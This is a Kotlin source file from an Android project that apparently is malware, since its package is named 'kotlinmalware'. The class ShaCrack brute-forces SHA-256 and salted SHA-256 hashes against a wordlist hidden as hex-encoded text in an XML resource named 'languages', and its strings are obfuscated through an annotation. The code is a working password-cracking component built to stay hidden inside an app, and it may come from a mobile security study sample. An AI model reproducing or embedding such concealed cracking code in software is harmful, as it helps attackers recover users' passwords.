package com.example.kotlinmalware

import android.content.Context
import android.util.Log
import com.mobilesec.govcomm.R
import io.github.c0nnor263.obfustringcore.ObfustringThis
import java.security.MessageDigest
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.xmlpull.v1.XmlPullParser
@ObfustringThis
class ShaCrack(private val context: Context) {

    suspend fun crackHash(hashToCrack: String) = withContext(Dispatchers.IO) {
        val parser = context.resources.getXml(R.xml.languages)
        while (parser.eventType != XmlPullParser.END_DOCUMENT) {
            if (parser.eventType == XmlPullParser.TEXT) {
                val word = decodeBase16(parser.text)
                val shaHash = sha256(word)
                //Log.d("ShaTried", shaHash)
                if (shaHash == hashToCrack) {
                    Log.d("ShaCrack", "Found: $word")
                    return@withContext word // Return found word
                }
            }
            parser.next()
        }
        //Log.d("ShaCrack", "Hash not found in wordlist.")
        return@withContext null // Hash not found
    }

    suspend fun crackSaltedHash(hashToCrack: String, salt: String) = withContext(Dispatchers.IO) {
        val parser = context.resources.getXml(R.xml.languages)
        while (parser.eventType != XmlPullParser.END_DOCUMENT) {
            if (parser.eventType == XmlPullParser.TEXT) {
                val word = decodeBase16(parser.text)
                val wordHashed = sha256(word)
                //Log.d("wordHashed", wordHashed)
                val saltedWord = wordHashed + salt
                //Log.d("saltedWord", saltedWord)
                val shaSaltedHash = sha256(saltedWord)
                //Log.d("ShaTried", shaSaltedHash)
                if (shaSaltedHash == hashToCrack) {
                    //Log.d("ShaCrack", "Found: $word")
                    return@withContext word // Return found word
                }
            }
            parser.next()
        }
        //Log.d("ShaCrack", "Salted hash not found in wordlist.")
        return@withContext null // Salted hash not found
    }

    private fun sha256(input: String): String {
        val bytes = MessageDigest.getInstance("SHA-256").digest(input.toByteArray())
        return bytes.joinToString("") { "%02x".format(it) }
    }
}



fun decodeBase16(hexString: String): String {
    // Check if the string has an even length
    if (hexString.length % 2 != 0) {
        throw IllegalArgumentException("Input string must have an even length")
    }

    // Convert the hexadecimal string to a byte array
    val bytes = hexString.chunked(2)
        .map { it.toInt(16).toByte() }
        .toByteArray()

    // Convert the byte array to a string
    return String(bytes, Charsets.UTF_8)
}